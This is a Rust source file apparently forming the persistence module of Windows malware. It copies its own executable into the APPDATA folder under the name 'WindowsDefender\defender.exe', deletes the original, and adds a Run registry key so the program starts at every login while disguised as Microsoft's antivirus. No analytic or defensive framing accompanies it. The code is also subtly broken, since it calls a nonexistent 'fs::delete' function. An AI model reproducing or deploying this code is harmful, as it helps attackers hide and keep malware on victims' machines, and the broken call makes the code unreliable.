use winreg::enums::*;
use winreg::RegKey;
use std::path::{Path, PathBuf};
use std::env;
use std::fs;

/// Target subpath inside APPDATA
const TARGET_SUBPATH: &str = "WindowsDefender\\defender.exe";

pub fn persist() -> std::io::Result<()> {
    // Resolve %APPDATA%
    let appdata = env::var("APPDATA")?;
    let target_path: PathBuf = Path::new(&appdata).join(TARGET_SUBPATH);

    // Ensure directory exists
    if let Some(dir) = target_path.parent() {
        fs::create_dir_all(dir)?;
    }

    // Current executable
    let current_exe = env::current_exe()?;

    // Copy itself if not already there
    if current_exe != target_path {
        fs::copy(&current_exe, &target_path)?;
        fs::delete(&current_exe)?;
    }

    // Registry persistence
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let (key, _) = hkcu.create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run")?;

    key.set_value("WindowsDefender", &target_path.to_string_lossy().to_string())?;

    println!("Persistence registered at {:?}", target_path);

    Ok(())
}